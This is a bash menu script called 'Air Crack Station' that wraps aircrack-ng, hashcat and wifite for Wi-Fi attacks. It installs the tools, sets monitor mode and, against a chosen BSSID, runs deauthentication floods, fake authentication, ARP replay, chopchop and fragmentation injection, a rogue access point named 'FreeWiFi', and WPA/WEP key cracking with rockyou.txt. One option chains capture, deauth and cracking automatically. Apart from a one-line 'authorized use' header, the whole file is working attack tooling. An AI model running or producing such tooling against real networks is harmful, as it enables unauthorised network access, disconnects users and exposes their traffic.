#!/usr/bin/env bash
###############################################
# ACS — Air Crack Station
# Made by Pakun & iinze0
# Authorized lab / pentest use only
###############################################
set -o pipefail

ACS_VER="1.0.0"
ACS_AUTHOR="Pakun & iinze0"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

have() { command -v "$1" >/dev/null 2>&1; }
pause() { read -r -p "Press Enter..."; }
confirm() {
  read -r -p "$(printf '%b%s [y/N]: %b' "$YELLOW" "$1" "$NC")" ans
  [[ "$ans" =~ ^[Yy]$ ]]
}

IFACE=""
MON=""
BSSID=""
ESSID=""
CHAN="6"
CLIENT=""
CAP="handshake"
WORDLIST="/usr/share/wordlists/rockyou.txt"

show_banner() {
  printf '%b' "${GREEN}${BOLD}"
  cat <<'EOF'

          _____
         |     |
         |_____|
        __|___|__
         / o o \
        |   >   |
         \_____/
     .---/     \---.
    /    ACS        \~~
   ~   crack station ~~

EOF
  printf '%b' "$NC"
  printf '  %bAir Crack Station%b  v%s\n' "${GREEN}${BOLD}" "$NC" "$ACS_VER"
  printf '  %bMade by %s%b\n\n' "${YELLOW}${BOLD}" "$ACS_AUTHOR" "$NC"
}

station_install() {
  echo -e "${CYAN}[+] Installing crack-station packages...${NC}"
  export DEBIAN_FRONTEND=noninteractive
  apt-get update -y
  apt-get install -y aircrack-ng hashcat hcxdumptool hcxtools wifite bully reaver \
    pixiewps macchanger john crunch cowpatty rfkill iw wireless-tools pciutils \
    usbutils ethtool mdk4 hostapd dnsmasq
  if [[ ! -f /usr/share/wordlists/rockyou.txt && -f /usr/share/wordlists/rockyou.txt.gz ]]; then
    gunzip -k /usr/share/wordlists/rockyou.txt.gz || true
  fi
  echo -e "${GREEN}[+] station ready${NC}"
  for b in airmon-ng airodump-ng aireplay-ng aircrack-ng airbase-ng airdecap-ng \
    airdecloak-ng airdrop-ng airgraph-ng airolib-ng airserv-ng airtun-ng \
    airventriloquist-ng besside-ng easside-ng tkiptun-ng wesside-ng wpaclean \
    ivstools makeivs-ng packetforge-ng buddy-ng hashcat hcxdumptool wifite; do
    if have "$b"; then echo -e "  ${GREEN}OK${NC}   $b"
    else echo -e "  ${RED}MISS${NC} $b"
    fi
  done
  pause
}

pick_wifi() {
  echo -e "${YELLOW}Wireless interfaces:${NC}"
  mapfile -t W < <(iw dev 2>/dev/null | awk '/Interface/{print $2}')
  if [[ ${#W[@]} -eq 0 ]]; then
    mapfile -t W < <(ip -o link show | awk -F': ' '{print $2}' | grep -E '^(wl|wlan)')
  fi
  if [[ ${#W[@]} -eq 0 ]]; then
    echo -e "${RED}[!] no wireless iface found${NC}"
    read -r -p "Interface name: " IFACE
    return
  fi
  local i
  for i in "${!W[@]}"; do
    echo "  $((i+1))) ${W[$i]}"
  done
  echo "  m) manual"
  read -r -p "Choice [1]: " c
  if [[ $c == m || $c == M ]]; then
    read -r -p "Interface: " IFACE
  elif [[ $c =~ ^[0-9]+$ ]] && ((c>=1 && c<=${#W[@]})); then
    IFACE="${W[$((c-1))]}"
  else
    IFACE="${W[0]}"
  fi
}

auto_monitor() {
  [[ -n $IFACE ]] || pick_wifi
  if [[ $IFACE == *mon ]]; then
    MON="$IFACE"
    echo -e "${GREEN}[+] already monitor: $MON${NC}"
    iw dev "$MON" info 2>/dev/null || true
    pause
    return
  fi
  echo -e "${GREEN}[+] auto monitor on $IFACE${NC}"
  rfkill unblock wifi 2>/dev/null || true
  rfkill unblock all 2>/dev/null || true
  airmon-ng check kill
  airmon-ng start "$IFACE"
  sleep 1
  if [[ -d /sys/class/net/${IFACE}mon ]]; then
    MON="${IFACE}mon"
  else
    MON=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep 'mon' | head -n1 || true)
    [[ -z $MON ]] && MON="${IFACE}mon"
  fi
  echo -e "${GREEN}[+] monitor iface: $MON${NC}"
  iwconfig "$MON" 2>/dev/null || iw dev "$MON" info
  pause
}

restore_managed() {
  local m="${MON:-${IFACE}mon}"
  echo -e "${YELLOW}[+] stopping $m${NC}"
  airmon-ng stop "$m" 2>/dev/null || true
  systemctl start NetworkManager 2>/dev/null || service NetworkManager start 2>/dev/null || true
  nmcli radio wifi on 2>/dev/null || true
  MON=""
  echo -e "${GREEN}[+] managed mode restored${NC}"
  pause
}

need_mon() {
  [[ -n $MON ]] && return 0
  echo -e "${YELLOW}[!] no monitor iface — running auto monitor${NC}"
  auto_monitor
  [[ -n $MON ]]
}

read_target() {
  read -r -p "BSSID [$BSSID]: " t; [[ -n $t ]] && BSSID="$t"
  read -r -p "ESSID [$ESSID]: " t; [[ -n $t ]] && ESSID="$t"
  read -r -p "Channel [$CHAN]: " t; [[ -n $t ]] && CHAN="$t"
  read -r -p "Client MAC (optional) [$CLIENT]: " t; [[ -n $t ]] && CLIENT="$t"
}

[[ $EUID -ne 0 ]] && { echo -e "${RED}[!] sudo bash acs.sh${NC}"; exit 1; }

show_banner
pick_wifi

while true; do
  clear
  echo -e "${GREEN}${BOLD}  ACS${NC}  ${YELLOW}by $ACS_AUTHOR${NC}  ${CYAN}v$ACS_VER${NC}"
  echo -e "  IFACE ${GREEN}${IFACE:-?}${NC}  MON ${GREEN}${MON:-off}${NC}  CH ${GREEN}$CHAN${NC}"
  echo -e "  BSSID ${GREEN}${BSSID:-—}${NC}  ESSID ${GREEN}${ESSID:-—}${NC}"
  echo
  echo -e "${YELLOW}Station${NC}"
  echo "  1) Crack-station install     2) Auto monitor mode"
  echo "  3) Restore managed           4) Set target (BSSID/ESSID/CH)"
  echo -e "${YELLOW}Capture${NC}"
  echo "  5) airodump-ng scan          6) airodump-ng lock AP"
  echo "  7) wpaclean                  8) ivstools convert"
  echo -e "${YELLOW}Inject${NC}"
  echo "  9) deauth                   10) fakeauth          11) ARP replay"
  echo " 12) chopchop                 13) fragmentation     14) caffe-latte"
  echo " 15) interactive replay       16) packetforge-ng    17) airdrop-ng"
  echo " 18) airventriloquist-ng      19) tkiptun-ng"
  echo -e "${YELLOW}Crack${NC}"
  echo " 20) aircrack-ng WPA          21) aircrack-ng WEP"
  echo " 22) besside-ng               23) wesside-ng        24) easside-ng + buddy"
  echo " 25) airolib-ng PMK           26) Handshake chain (dump+deauth+crack)"
  echo -e "${YELLOW}AP / tunnel${NC}"
  echo " 27) airbase-ng               28) airtun-ng         29) airserv-ng"
  echo -e "${YELLOW}Crypto / util${NC}"
  echo " 30) airdecap-ng              31) airdecloak-ng     32) airgraph-ng"
  echo " 33) makeivs-ng               34) kstats            35) wifite"
  echo "  0) Exit (restore monitor)"
  echo
  read -r -p "  Option: " o
  case $o in
    1) station_install ;;
    2) auto_monitor ;;
    3) restore_managed ;;
    4) read_target ;;
    5) need_mon && airodump-ng --band bg "$MON" ;;
    6)
      need_mon || continue
      read_target
      airodump-ng -c "$CHAN" --bssid "$BSSID" -w "$CAP" "$MON"
      ;;
    7) read -r -p "input cap: " in; wpaclean handshake-clean.cap "${in:-handshake-01.cap}" ;;
    8) read -r -p "pcap: " in; ivstools --convert "${in:-wep.cap}" wep.ivs ;;
    9)
      need_mon || continue
      read_target
      if [[ -n $CLIENT ]]; then
        aireplay-ng --deauth 8 -a "$BSSID" -c "$CLIENT" "$MON"
      else
        aireplay-ng --deauth 8 -a "$BSSID" "$MON"
      fi
      ;;
    10) need_mon || continue; read_target; aireplay-ng --fakeauth 0 -a "$BSSID" "$MON" ;;
    11) need_mon || continue; read_target; aireplay-ng --arpreplay -b "$BSSID" -h "$CLIENT" "$MON" ;;
    12) need_mon || continue; read_target; aireplay-ng --chopchop -b "$BSSID" -h "$CLIENT" "$MON" ;;
    13) need_mon || continue; read_target; aireplay-ng --fragment -b "$BSSID" -h "$CLIENT" "$MON" ;;
    14) need_mon || continue; read_target; aireplay-ng --caffe-latte -b "$BSSID" "$MON" ;;
    15) need_mon || continue; read_target; aireplay-ng --interactive -b "$BSSID" -p 0841 "$MON" ;;
    16) read_target; packetforge-ng -0 -a "$BSSID" -h "$CLIENT" -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp-forged.cap ;;
    17) need_mon || continue; read -r -p "airodump csv: " csv; airdrop-ng -i "$MON" -t "$csv" ;;
    18) need_mon || continue; read_target; airventriloquist-ng -i "$MON" -d "$CLIENT" ;;
    19) need_mon || continue; read_target; tkiptun-ng -a "$BSSID" -h "$CLIENT" "$MON" ;;
    20)
      read -r -p "cap [$CAP-01.cap]: " cap; cap="${cap:-$CAP-01.cap}"
      read -r -p "wordlist [$WORDLIST]: " w; w="${w:-$WORDLIST}"
      extra=""; [[ -n $BSSID ]] && extra="-b $BSSID"
      aircrack-ng -w "$w" $extra "$cap"
      ;;
    21) read -r -p "cap/ivs: " cap; aircrack-ng -b "$BSSID" "${cap:-wep.cap}" ;;
    22) need_mon || continue; read_target; besside-ng ${BSSID:+-b "$BSSID"} "$MON" ;;
    23) need_mon || continue; read_target; wesside-ng -i "$MON" ${BSSID:+-n "$BSSID"} ;;
    24)
      echo "Start buddy-ng on the helper, then this box runs easside-ng"
      read -r -p "buddy IP: " ip
      need_mon || continue
      read_target
      easside-ng -i "$MON" -b "$BSSID" -s "$ip"
      ;;
    25)
      read_target
      airolib-ng pmk.db --import essid <(echo "$ESSID")
      airolib-ng pmk.db --import passwd "$WORDLIST"
      airolib-ng pmk.db --batch
      aircrack-ng -r pmk.db "$CAP-01.cap"
      ;;
    26)
      need_mon || continue
      read_target
      echo -e "${GREEN}[+] capturing on $BSSID ch $CHAN — Ctrl-C when handshake seen${NC}"
      airodump-ng -c "$CHAN" --bssid "$BSSID" -w "$CAP" "$MON" &
      DUMP=$!
      sleep 4
      if [[ -n $CLIENT ]]; then
        aireplay-ng --deauth 6 -a "$BSSID" -c "$CLIENT" "$MON" || true
      else
        aireplay-ng --deauth 8 -a "$BSSID" "$MON" || true
      fi
      echo "Waiting on airodump — Ctrl-C when handshake is in the top-right"
      wait $DUMP || true
      aircrack-ng -w "$WORDLIST" -b "$BSSID" "$CAP-01.cap"
      ;;
    27) need_mon || continue; read_target; airbase-ng -a "${BSSID:-00:11:22:33:44:55}" -e "${ESSID:-FreeWiFi}" -c "$CHAN" "$MON" ;;
    28) need_mon || continue; read_target; airtun-ng -a "$BSSID" -e "$ESSID" "$MON" ;;
    29) need_mon || continue; airserv-ng -d "$MON" -p 666 ;;
    30) read_target; read -r -p "passphrase: " pw; airdecap-ng -e "$ESSID" -p "$pw" "${CAP}-01.cap" ;;
    31) read -r -p "cap: " cap; airdecloak-ng -i "${cap:-cloaked.cap}" ;;
    32) read -r -p "csv: " csv; airgraph-ng -i "$csv" -o graph.png -g CAPR ;;
    33) makeivs-ng -k AABBCCDDEE -o test.ivs -s 10000 ;;
    34) kstats wep.ivs ;;
    35) have wifite && wifite || echo "wifite not installed — option 1" ;;
    0)
      [[ -n $MON ]] && confirm "Restore managed mode?" && restore_managed
      exit 0
      ;;
  esac
done
